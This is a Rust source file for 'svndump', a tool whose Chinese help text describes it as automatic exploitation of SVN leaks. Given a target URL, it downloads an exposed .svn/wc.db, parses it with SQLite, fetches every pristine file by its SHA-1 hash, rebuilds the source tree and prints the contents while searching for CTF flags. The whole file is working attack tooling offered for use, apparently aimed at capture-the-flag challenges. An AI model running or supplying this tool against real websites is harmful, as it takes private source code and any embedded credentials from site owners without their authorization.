//! svndump - SVN 泄露自动利用（wc.db 解析 + pristine 下载）
//! 纯 Rust: rusqlite 解析 wc.db, HTTP 下载 pristine, 不依赖 svn 命令行

use clap::Parser;
use common::http::{HttpClient, HttpOpts};
use common::{exit, finish, scan_flags, Mode, Out};
use rusqlite::Connection;
use serde::Serialize;
use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::process::ExitCode;

#[derive(Parser, Debug)]
#[command(
    name = "svndump",
    version,
    about = "SVN 泄露自动利用（wc.db 解析 + pristine 下载）",
    long_about = "svndump -- SVN 泄露自动利用（wc.db 解析 + pristine 下载）\n\n用法:\n  svndump <URL>                 下载 wc.db, 解析, 下载 pristine 文件, cat 出 flag\n  svndump <URL> --out 目录      指定输出目录（默认 svndump_<host>/）\n  svndump <URL> --list          只列出 wc.db 里的文件清单，不下载\n  svndump <URL> --cat 文件名    下载后直接 cat 指定文件\n\n示例:\n  svndump http://目标/.svn\n  svndump http://目标 --list\n  svndump http://目标 --cat flag_1804218695.txt\n\n退出码: 0=成功 1=无结果 2=用法错误 3=运行错误",
    after_help = "退出码: 0=成功 1=无结果 2=用法错误 3=运行错误"
)]
struct Args {
    /// 目标 URL
    #[arg(value_name = "URL")]
    url: String,

    /// 指定输出目录（默认 svndump_<host>/）
    #[arg(long, value_name = "目录")]
    out: Option<String>,

    /// 只列出 wc.db 里的文件清单，不下载
    #[arg(long)]
    list: bool,

    /// 下载后直接 cat 指定文件
    #[arg(long, value_name = "文件名")]
    cat: Option<String>,

    /// HTTP 超时(秒)
    #[arg(long, default_value_t = 10, value_name = "SECS")]
    timeout: u64,

    /// HTTP 代理
    #[arg(long, value_name = "URL")]
    proxy: Option<String>,

    /// 跳过 TLS 证书校验
    #[arg(long)]
    insecure: bool,

    /// 自定义 User-Agent
    #[arg(long, value_name = "UA")]
    ua: Option<String>,

    /// Cookie
    #[arg(long, value_name = "COOKIE")]
    cookie: Option<String>,

    /// JSON 输出
    #[arg(long)]
    json: bool,
}

#[derive(Serialize, Clone)]
struct EntryOut {
    path: String,
    presence: String,
    checksum: String,
}

type EntryRow = (String, String, Option<String>);

#[derive(Serialize)]
struct PristineOut {
    sha: String,
    size: usize,
}

#[derive(Serialize)]
struct Report {
    tool: &'static str,
    target: String,
    out: String,
    wc_db_size: usize,
    format: Option<String>,
    entries: Vec<EntryOut>,
    need: usize,
    downloaded: Vec<PristineOut>,
    written: Vec<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    cat: Option<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    flags: Vec<String>,
}

fn encode_url(url: &str) -> String {
    let Some(scheme_end) = url.find("://") else {
        return url.to_string();
    };
    let rest = &url[scheme_end + 3..];
    let path_start = rest
        .find('/')
        .map(|i| scheme_end + 3 + i)
        .unwrap_or(url.len());
    let (base, path) = url.split_at(path_start);
    let mut out = String::with_capacity(url.len());
    out.push_str(base);
    for &b in path.as_bytes() {
        let keep = b.is_ascii_alphanumeric()
            || matches!(
                b,
                b'-' | b'.'
                    | b'_'
                    | b'~'
                    | b'/'
                    | b'%'
                    | b'!'
                    | b'$'
                    | b'&'
                    | b'\''
                    | b'('
                    | b')'
                    | b'*'
                    | b'+'
                    | b','
                    | b';'
                    | b'='
                    | b':'
                    | b'@'
            );
        if keep {
            out.push(b as char);
        } else {
            out.push_str(&format!("%{b:02X}"));
        }
    }
    out
}

fn fetch(client: &HttpClient, url: &str) -> Option<Vec<u8>> {
    let encoded = encode_url(url);
    for attempt in 0..3u64 {
        match client.get(&encoded) {
            Ok(r) if r.is_success() && !r.body.is_empty() => return Some(r.body),
            Ok(_) => return None,
            Err(_) if attempt < 2 => {
                std::thread::sleep(std::time::Duration::from_millis(10 * (attempt + 1)));
            }
            Err(_) => return None,
        }
    }
    None
}

fn host_slug(url: &str) -> String {
    url.split("://")
        .last()
        .unwrap_or(url)
        .replace(['/', ':'], "_")
}

fn safe_join(base: &Path, rel: &str) -> Option<PathBuf> {
    let mut p = PathBuf::new();
    for comp in rel.split('/') {
        if comp.is_empty() || comp == "." || comp == ".." {
            return None;
        }
        p.push(comp);
    }
    if p.as_os_str().is_empty() {
        None
    } else {
        Some(base.join(p))
    }
}

fn write_out(base: &Path, rel: &str, data: &[u8]) -> std::io::Result<()> {
    let dest = match safe_join(base, rel) {
        Some(d) => d,
        None => return Ok(()),
    };
    if let Some(parent) = dest.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(dest, data)
}

fn clean_sha(cs: &str) -> Option<String> {
    let clean = cs
        .replace("$sha1$", "")
        .replace("sha1$", "")
        .split('!')
        .next()
        .unwrap_or("")
        .to_string();
    if clean.len() == 40 {
        Some(clean)
    } else {
        None
    }
}

fn query_entries(conn: &Connection, sql: &str) -> Result<Vec<EntryRow>, rusqlite::Error> {
    let mut stmt = conn.prepare(sql)?;
    let rows = stmt.query_map([], |row| {
        Ok((
            row.get::<_, Option<String>>(0)?,
            row.get::<_, Option<String>>(1)?,
            row.get::<_, Option<String>>(2)?,
        ))
    })?;
    let mut out = Vec::new();
    for r in rows {
        let (path, presence, checksum) = r?;
        if let Some(path) = path {
            if let Some(presence) = presence {
                if presence != "not-present" && presence != "excluded" && presence != "unversioned" {
                    out.push((path, presence, checksum));
                }
            }
        }
    }
    Ok(out)
}

fn load_entries(conn: &Connection) -> (Vec<EntryRow>, Option<String>) {
    let first = "SELECT local_relpath, presence, checksum FROM NODES ORDER BY local_relpath, op_depth DESC";
    match query_entries(conn, first) {
        Ok(rows) => (rows, None),
        Err(e1) => {
            let second = "SELECT path, presence, checksum FROM NODES ORDER BY path, op_depth DESC";
            match query_entries(conn, second) {
                Ok(rows) => (rows, None),
                Err(e2) => (Vec::new(), Some(format!("{e1} / {e2}"))),
            }
        }
    }
}

fn main() -> ExitCode {
    let args = Args::parse();
    let out = Out::new(Mode::from_flag(args.json));

    let mut url = args.url.trim_end_matches('/').to_string();
    if !url.ends_with(".svn") {
        url.push_str("/.svn");
    }
    url.push('/');

    let out_dir = args
        .out
        .clone()
        .unwrap_or_else(|| format!("svndump_{}", host_slug(&url)));

    let opts = HttpOpts {
        timeout: args.timeout,
        proxy: args.proxy.clone(),
        insecure: args.insecure,
        user_agent: args
            .ua
            .clone()
            .unwrap_or_else(|| HttpOpts::default().user_agent),
        cookie: args.cookie.clone(),
        ..HttpOpts::default()
    };
    let client = match HttpClient::new(&opts) {
        Ok(c) => c,
        Err(e) => {
            out.error(&format!("HTTP 初始化失败: {e}"));
            return finish(exit::ERROR);
        }
    };

    out.info(&format!("[*] 目标: {url}"));
    let wcdb = match fetch(&client, &format!("{url}wc.db")) {
        Some(d) if d.len() >= 100 => d,
        _ => {
            out.info("[!] wc.db 下载失败或文件过小，可能不是 SVN 1.7+");
            return finish(exit::NO_RESULT);
        }
    };
    out.info(&format!("[*] wc.db: {} 字节", wcdb.len()));

    let format = fetch(&client, &format!("{url}format"))
        .map(|b| String::from_utf8_lossy(&b).trim().to_string());
    if let Some(f) = &format {
        out.info(&format!("[*] SVN 格式: {f}"));
    }

    let tmp = std::env::temp_dir().join(format!("_svndump_wcdb_{}.tmp", std::process::id()));
    if let Err(e) = std::fs::write(&tmp, &wcdb) {
        out.error(&format!("临时文件写入失败: {e}"));
        return finish(exit::ERROR);
    }
    let conn = match Connection::open(&tmp) {
        Ok(c) => c,
        Err(e) => {
            let _ = std::fs::remove_file(&tmp);
            out.error(&format!("wc.db 打开失败: {e}"));
            return finish(exit::ERROR);
        }
    };

    let (raw_entries, query_err) = load_entries(&conn);
    let mut entries: Vec<EntryOut> = Vec::new();
    let mut seen: HashSet<String> = HashSet::new();
    for (path, presence, checksum) in raw_entries {
        if !seen.insert(path.clone()) {
            continue;
        }
        entries.push(EntryOut {
            path,
            presence,
            checksum: checksum.unwrap_or_default(),
        });
    }

    let mut pristine_list: Vec<String> = Vec::new();
    if let Ok(mut stmt) = conn.prepare("SELECT checksum FROM PRISTINE") {
        if let Ok(rows) = stmt.query_map([], |row| row.get::<_, Option<String>>(0)) {
            for r in rows.flatten().flatten() {
                let dup = entries.iter().any(|e| e.checksum == r);
                if !dup {
                    pristine_list.push(r);
                }
            }
        }
    }
    drop(conn);
    let _ = std::fs::remove_file(&tmp);

    if let Some(e) = &query_err {
        out.info(&format!("[!] NODES 查询失败: {e}"));
    }

    out.info(&format!("[*] 文件条目: {}", entries.len()));
    for e in &entries {
        let cs: String = e.checksum.replace("$sha1$", "sha1$").chars().take(20).collect();
        out.info(&format!("    {:<40} {:<15} {}", e.path, e.presence, cs));
    }

    if args.list {
        let code = if entries.is_empty() { exit::NO_RESULT } else { exit::OK };
        let report = Report {
            tool: "svndump",
            target: url,
            out: out_dir,
            wc_db_size: wcdb.len(),
            format,
            entries,
            need: 0,
            downloaded: Vec::new(),
            written: Vec::new(),
            cat: None,
            flags: Vec::new(),
        };
        out.emit(|| {}, &report);
        return finish(code);
    }

    let mut path_sha: Vec<(String, String)> = Vec::new();
    for e in &entries {
        if let Some(sha) = clean_sha(&e.checksum) {
            path_sha.push((e.path.clone(), sha));
        }
    }

    let mut all_shas: Vec<String> = path_sha.iter().map(|(_, s)| s.clone()).collect();
    for cs in &pristine_list {
        if let Some(s) = clean_sha(cs) {
            if !all_shas.contains(&s) {
                all_shas.push(s);
            }
        }
    }
    all_shas.sort();
    all_shas.dedup();

    out.info(&format!("[*] 需下载: {} 个 pristine 文件", all_shas.len()));

    if let Err(e) = std::fs::create_dir_all(&out_dir) {
        out.error(&format!("创建输出目录失败: {e}"));
        return finish(exit::ERROR);
    }

    let mut downloaded: Vec<(String, Vec<u8>)> = Vec::new();
    for sha in &all_shas {
        let pristine_path = format!("pristine/{}/{}.svn-base", &sha[..2], sha);
        if let Some(data) = fetch(&client, &format!("{url}{pristine_path}")) {
            out.info(&format!("    [+] {pristine_path} ({} B)", data.len()));
            downloaded.push((sha.clone(), data));
        }
    }
    out.info(&format!("[*] 下载完成: {}/{}", downloaded.len(), all_shas.len()));

    let mut written: Vec<String> = Vec::new();
    for (path, sha) in &path_sha {
        if let Some((_, data)) = downloaded.iter().find(|(s, _)| s == sha) {
            match write_out(Path::new(&out_dir), path, data) {
                Ok(()) => written.push(path.clone()),
                Err(e) => out.error(&format!("写入 {path} 失败: {e}")),
            }
        }
    }

    out.info(&format!("[+] 写出文件: {} 个 -> {out_dir}/", written.len()));

    let cat_content = args.cat.as_ref().and_then(|want| {
        path_sha
            .iter()
            .find(|(p, _)| p == want)
            .and_then(|(_, sha)| downloaded.iter().find(|(s, _)| s == sha))
            .map(|(_, data)| String::from_utf8_lossy(data).to_string())
    });
    if let Some(want) = &args.cat {
        match &cat_content {
            Some(c) => {
                out.info(&format!("\n--- {want} ---"));
                out.info(c.trim());
            }
            None => out.info(&format!("[!] 未找到 {want}")),
        }
    }

    out.info("\n[+] 扫描结果:");
    let mut flags: Vec<String> = Vec::new();
    for (path, sha) in &path_sha {
        if let Some((_, data)) = downloaded.iter().find(|(s, _)| s == sha) {
            let content_str = String::from_utf8_lossy(data).trim().to_string();
            out.info(&format!("    {path}:"));
            out.info(&format!("        {content_str}"));
            if content_str.contains("ctfhub") || content_str.to_lowercase().contains("flag") {
                out.info("    >>> FLAG <<<");
            }
            flags.extend(scan_flags(data));
        }
    }
    flags.sort();
    flags.dedup();

    let report = Report {
        tool: "svndump",
        target: url,
        out: out_dir,
        wc_db_size: wcdb.len(),
        format,
        entries,
        need: all_shas.len(),
        downloaded: downloaded
            .iter()
            .map(|(s, d)| PristineOut {
                sha: s.clone(),
                size: d.len(),
            })
            .collect(),
        written: written.clone(),
        cat: cat_content,
        flags,
    };
    out.emit(|| {}, &report);

    if written.is_empty() {
        finish(exit::NO_RESULT)
    } else {
        finish(exit::OK)
    }
}
